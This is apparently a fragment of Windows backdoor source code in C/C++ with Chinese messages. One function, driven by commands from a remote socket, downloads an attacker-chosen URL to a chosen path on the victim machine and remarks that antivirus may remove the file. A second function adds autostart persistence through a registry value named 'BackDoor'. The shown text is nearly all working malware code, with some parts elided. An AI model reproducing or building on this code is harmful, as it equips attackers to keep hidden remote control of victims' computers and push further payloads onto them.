...
BOOL DownFileFunc(SOCKET m_Sock)
{
	...
	if (SendData(m_Sock, (void*)_T("请输入目标文件的URL："), _tcslen(_T("请输入目标文件的URL："))) > 0 && GetCmdString(m_Sock, szDstUrl)) {
		if (SendData(m_Sock, (void*)_T("请输入目标文件的保存路径："), _tcslen(_T("请输入目标文件的保存路径："))) > 0 && GetCmdString(m_Sock, szDstPath)) {
			while (CheckFileExist(szDstPath)) {
				SendData(m_Sock, (void*)_T("文件已存在请重新输入路径："), _tcslen(_T("文件已存在请重新输入路径：")));
				GetCmdString(m_Sock, szDstPath);
			}
			SendData(m_Sock, (void*)_T("文件下载中，请稍等……\r\n"), _tcslen(_T("文件下载中，请稍等……\r\n")));
			HRESULT hr = URLDownloadToFile(NULL, szDstUrl, szDstPath, 0, NULL);
			if (hr == S_OK) {
				if (CheckFileExist(szDstPath)) {
					SendData(m_Sock, (void*)_T("文件下载成功！\r\n"), _tcslen(_T("文件下载成功！\r\n")));
				}
				else {
					SendData(m_Sock, (void*)_T("文件下载成功，但是文件不存在，很可能被杀毒软件查杀！\r\n"), _tcslen(_T("文件下载成功，但是文件不存在，很可能被杀毒软件查杀！\r\n")));
				}
			}
			else if (hr == INET_E_DOWNLOAD_FAILURE) {
				SendData(m_Sock, (void*)_T("URL 不正确，文件下载失败！\r\n"), _tcslen(_T("URL 不正确，文件下载失败！\r\n")));
				bRet = FALSE;
			}
			else {
				SendData(m_Sock, (void*)_T("文件下载失败，请检查URL是否正确！\r\n"), _tcslen(_T("文件下载失败，请检查URL是否正确！\r\n")));
				bRet = FALSE;
			}
		}
	}
...
BOOL AutoRunWithReg()
{
	...
	lRet = RegSetValueEx(hKey, _T("BackDoor"), 0, REG_SZ, (BYTE *)szPath, sizeof(szPath));
	if (lRet != ERROR_SUCCESS) {
		bRet = FALSE;
	}
